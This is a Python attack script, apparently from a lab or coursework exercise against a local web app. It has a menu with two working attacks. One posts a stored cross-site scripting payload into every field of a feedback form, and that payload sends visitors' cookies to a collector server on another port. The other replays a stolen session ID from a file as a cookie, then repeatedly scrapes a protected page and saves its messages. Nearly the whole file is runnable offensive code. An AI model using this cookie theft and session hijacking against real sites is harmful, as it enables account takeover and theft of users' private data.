from requests_html import * # https://requests.readthedocs.io/projects/requests-html/en/latest/
from bs4 import BeautifulSoup # https://www.crummy.com/software/BeautifulSoup/bs4/doc/
import random # Standard python library

def hijack():
    demo_session = HTMLSession() # Initilise base HTML session
    hijack_session = HTMLSession() # Initilise hijack HTML session
    page = demo_session.get("http://localhost:5000/protected") # Get content of protected page
    demo_content = page.content.decode() # decode content
    print(demo_content) # print content
    lines = open("session_db.txt", "r").read().splitlines() # open session db and read by line
    session_id = random.choice(lines) # pick random line
    print(session_id) # print session id
    session_cookie = {'session' : session_id} # build payload dict
    page_post = hijack_session.post("http://localhost:5000/protected", cookies=session_cookie) # post session payload to protected page
    while True:
        page_get = hijack_session.get("http://localhost:5000/protected") # Get content hijacked protected
        content = page_get.content.decode() # decode content
        print(content)
        f = open("scraped_messeges.txt", "w")
        f.write(content) # write scraped messages
        f.close()

def payload():
    payload_session = HTMLSession() # Initilise payload HTML session

    page = payload_session.get('http://localhost:5000/feedback') # Get content of public feedback page
    soup = BeautifulSoup(page.content, "lxml") # Parse content with beautiful soup as lxml
    print(soup) # Print parsed data
    payload = {} # define payload dict
    search = [(element['name']) for element in soup.find_all('input', attrs={'name': True})] # Search for elements with name 'input' in soup output [10]
    print(search) # print search output
    for x in search: # Iterate for every input found in search
        payload.update({x : "<script>var i=new Image;i.src=\"http://localhost:3500/?\"+document.cookie;</script>"}) # Form payload with name of input and script to load fake image on hostile web server requesting local cookies  [11]
    r = payload_session.post('http://localhost:5000/feedback',payload) # Post payload to client
    print("Payload sent")

def main():
    flag = 1
    while flag == 1:
        choice = input("Deliver payload (1) or hijack session from session_db.txt (2): ") # Menu
        if choice == "1":
            flag = 0
            payload()
        elif choice == "2":
            flag = 0
            hijack()
        else:
            print("Invalid input")

main()
